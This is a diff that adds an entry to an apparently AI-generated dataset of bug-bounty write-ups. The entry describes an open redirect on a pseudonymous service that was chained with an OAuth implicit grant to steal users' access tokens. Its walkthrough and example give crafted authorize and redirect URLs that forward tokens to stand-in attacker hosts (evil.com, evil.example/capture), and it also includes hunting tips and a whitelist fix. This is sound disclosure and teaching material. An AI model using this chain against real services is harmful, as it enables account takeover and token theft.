@@ -1,5 +1,45 @@
 [
   {
+    "id": "14b79769fa87",
+    "title": "$8,800 for a Redirect Nobody Validated: Stealing OAuth Tokens Through an Open Redirect",
+    "url": "https://medium.com/@t4nv1/8-800-for-a-redirect-nobody-validated-stealing-oauth-tokens-through-an-open-redirect-7645d4122944",
+    "source": {
+      "slug": "medium-tag-writeup",
+      "name": "Medium — #bug-bounty-writeup"
+    },
+    "authors": [
+      "T4nv1"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-10-12T09:21:01.000Z",
+    "added_at": "2026-10-12T17:48:25.369Z",
+    "categories": [
+      "auth-bypass"
+    ],
+    "severity": "high",
+    "difficulty": "intermediate",
+    "summary_en": "An unauthenticated open redirect on Pinehaven’s domain allowed an attacker to capture OAuth implicit‑grant tokens, enabling full account takeover.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The Pinehaven application provides a marketing link‑tracking endpoint at /out that accepts a “url” query parameter. The server forwards the request to whatever value is supplied without any validation or whitelist. Because the OAuth implicit flow is configured to trust the Pinehaven domain, the redirect URL after user consent is allowed to be any URL on that same domain. An attacker can therefore supply a malicious external URL, causing the OAuth provider to send the access token to the attacker’s site, leaking the token. The combination of an unrestricted redirect and a trusted OAuth redirect domain creates the vulnerability.",
+      "walkthrough": "RECON\nStep 1: Locate the redirect endpoint used by Pinehaven’s marketing feature.\nCode: https://pinehaven.io/out?url=https://external-site.com\nWhy: The path \"/out\" with a query parameter “url” tells the server where to send the user (HTTP request = browser‑to‑server message, parameter = data in the URL).\n\nStep 2: Verify that the endpoint accepts any destination.\nCode: https://pinehaven.io/out?url=https://evil.com\nWhy: The server redirects to the supplied URL without checking its domain (no validation = security flaw).\n\nEXPLOITATION\nStep 3: Start an OAuth implicit‑grant flow that uses Pinehaven’s domain as the registered redirect URI.\nCode: https://auth.pinehaven.io/authorize?client_id=ATTACKER&response_type=token&redirect_uri=https://pinehaven.io/out?url=https://evil.com\nWhy: \"response_type=token\" tells the OAuth server to return the access token directly in the URL fragment (the part after “#”). The redirect_uri points to the vulnerable /out endpoint, and the attacker‑controlled “url” parameter points to their site.\n\nStep 4: Convince a legitimate user to authorize the request.\nWhy: After the user clicks “Allow”, the OAuth server redirects to the provided redirect_uri, which is the vulnerable endpoint.\n\nStep 5: Pinehaven’s /out endpoint receives the request and immediately redirects the user’s browser to https://evil.com, appending the fragment that contains the access token.\nWhy: The fragment (e.g., #access_token=abc…) is not sent to the server but stays in the browser, so the attacker’s site can read it with JavaScript.\n\nIMPACT\nStep 6: The attacker’s site captures the token and can use it to act as the user on Pinehaven’s API.\nWhy: Possessing a valid OAuth access token grants the same permissions as the user (full API access).",
+      "example": "Assume a fictional service at https://target.example provides an endpoint https://target.example/redirect?dest=URL. The code simply does: response.sendRedirect(request.getParameter(\"dest\")); No whitelist is applied. An attacker crafts https://target.example/redirect?dest=https://evil.example/capture. When a victim logs in via an OAuth implicit flow that registers https://target.example/redirect as the redirect URI, the provider sends the token to https://target.example/redirect#access_token=XYZ. The vulnerable endpoint then forwards the browser to https://evil.example/capture#access_token=XYZ, where the attacker’s JavaScript reads the fragment and steals the token. This mirrors the Pinehaven issue: unrestricted redirect + trusted OAuth domain leads to token leakage.",
+      "takeaway": "When hunting OAuth implementations, always look for open‑redirect endpoints on the same domain that is registered as a redirect URI. Test any \"url\" or \"next\" parameters with an external domain; if the service redirects without validation, the implicit grant flow can be abused to steal tokens. Tools like Burp Suite or OWASP ZAP can automate parameter fuzzing. Variants include open redirects combined with authorization‑code flows that exchange codes for tokens, or open redirects in SAML/SSO endpoints. Beginners often forget that the fragment containing the token never reaches the server, so they think the redirect is harmless—remember the browser will still follow it and expose the token to the attacker’s site.",
+      "fix": "Validate the destination URL of the /out endpoint against a whitelist of allowed domains, or restrict it to internal paths only. Example fix in pseudo‑code: String dest = request.getParameter(\"url\"); if (!dest.matches(\"^https://pinehaven\\.io/.*$\")) { return error(400); } response.sendRedirect(dest); This ensures only URLs under the trusted domain are accepted, preventing attackers from directing users to external sites and capturing OAuth tokens.",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "Open redirects usually get dismissed quickly during triage, and for good reason — on their own, “this URL redirects somewhere I chose” rarely causes real harm beyond aiding a phishing page’s credibility. This one escalated past that baseline because the redirect lived on the exact domain an OAuth flow had been configured to trust, and OAuth implicit flows leak tokens through exactly the mechanism an open redirect hands an attacker for free. The target, which I’ll call **Pinehaven** here per their program’s disclosure terms, is a project-tracking platform offering an OAuth-based API for third-p",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
     "id": "bdc88d6fa5f4",
     "title": "From Recon to Full Read/Write DB Access — A Bug Bounty Story",
     "url": "https://medium.com/@sadinfinite/from-recon-to-full-read-write-db-access-a-bug-bounty-story-ce1197a0983c",
